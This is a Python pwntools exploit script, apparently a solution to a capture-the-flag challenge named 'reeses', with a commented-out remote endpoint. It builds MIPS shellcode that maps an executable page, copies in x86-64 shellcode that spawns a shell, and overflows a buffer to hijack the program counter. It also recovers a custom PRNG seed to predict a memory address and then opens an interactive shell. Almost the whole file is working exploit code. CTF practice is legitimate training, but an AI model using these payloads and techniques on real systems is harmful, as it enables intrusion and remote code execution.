#!/usr/bin/python
from pwn import *
import os
import random

arr = [0,]*32
state = 0

def rand():
    global state
    v0 = arr[((state + 24) & 0x1F)] & 0xffffffff;
    v1 = (state + 31) & 0x1F;
    v2 = (state + 31) & 0x1F;
    v3 = (arr[((state + 3) & 0x1F)] >> 8) ^ arr[state] ^ arr[((state + 3) & 0x1F)];
    v4 = ((arr[((state + 10) & 0x1F)] << 14)&0xffffffff )^ ((v0 << 19)&0xffffffff) ^ v0 ^ arr[((state + 10) & 0x1F)];
    result = ((v4 << 13)&0xffffffff) ^ ((v3 << 7)&0xffffffff) ^ v4 ^ v3 ^ ((arr[v2] << 11)&0xffffffff) ^ arr[v2];
    arr[state] = v4 ^ v3;
    arr[v2] = result;
    state = v1;
    return result;

def srand(seed):
    arr[0] = seed
    for i in range(31):
        arr[i+1] = (0x7ffff * (((arr[i] >> 30) + i + 1) ^ arr[i])) & 0xffffffff

def make_payload():
  context.arch = 'amd64'
  x86_code = asm(shellcraft.amd64.linux.sh())

  context.arch = 'mips'
  fp = open("in", "w")

  sc = shellcraft.mips.linux.syscall('SYS_open')  # get random value
  sc += shellcraft.mips.push('$v0')
  sc += shellcraft.mips.linux.syscall('SYS_write', 1, '$sp', 4)   # print random value
  sc += shellcraft.mips.linux.syscall('SYS_mknod', 0x430000, 0x1000)  # setup rwx page
  sc += shellcraft.mips.mov('$t1', 0x430000)
  for i in range(len(x86_code) / 4 + 1):
    sc += shellcraft.mips.mov('$t0', u32(x86_code[4*i:4*(i+1)].ljust(4, '\x00')))
    sc += 'sw $t0, %d($t1)\n' % (4*i)
  # write x64 shellcode on the page
  
  sc += shellcraft.mips.mov('$a0', 1)
  sc += shellcraft.mips.mov('$a1', 1)
  sc += shellcraft.mips.linux.syscall('SYS_read', 0, '$sp', 8)  # get return address
  sc += 'lw $a2, 0($sp)\n'
  sc += 'lw $a3, 4($sp)\n'  # set return address
  sc += shellcraft.mips.mov('$v0', 1)
  sc += shellcraft.mips.mov('$v1', 1)
  sc += shellcraft.mips.mov('$t0', 1)
  sc += shellcraft.mips.mov('$t1', 1)
  sc += shellcraft.mips.mov('$t2', 1)
  sc += shellcraft.mips.mov('$t3', 1)
  sc = asm(sc)
  sc += '\x00\x00\x00\x20'
  sc += '\x00\x00\xc0\x14'
  sc += '\x00\x00\xe0\xcf\xaa\xaa\xaa'  # trigger vuln
  print disasm(sc)

  addr = 0x4020ac   # mips paylaod address
  size = 0x25f00
  offset = 32
  pay = '\x00'*(size-offset-4 - len(sc))  # nop
  pay += sc
  pay += p32(addr)  # mips pc control
  pay += "X"*offset

  fp.write(pay)
  fp.close()

target = './sample1'
input = './out'

p = process('./reeses')
#p = remote('reeses_fc849330ede1f497195bad5213deaebc.quals.shallweplayaga.me', 3456)
#raw_input()

f = open(target, 'rb')
print hex(os.path.getsize(target))
p.send(p32(os.path.getsize(target)))
p.send(f.read())

p.recvuntil('<<RUNNING>>\n')

os.system('./lzss e in out')  # encode our input
f = open(input, 'rb')
p.send(chr(1))    # decode
print hex(os.path.getsize(input))
p.send(p32(os.path.getsize(input)))
p.send(f.read())

random_val = u32(p.recvn(4))
print 'first random value : ', hex(random_val)  # get random value

finder = process('./find 2684354560 ' + str(random_val), shell=True)  # get rondom seed
seed = int(finder.recvline()[:-1], 16)
print 'seed', hex(seed)
srand(seed)
finder.close()

print hex(rand()) # first

mmap_addr = (rand() << 12) | 0x400000000000 # second

print 'mmaped addr : ', hex(mmap_addr)
p.send(p64(mmap_addr))  # send shellcode address

p.interactive()
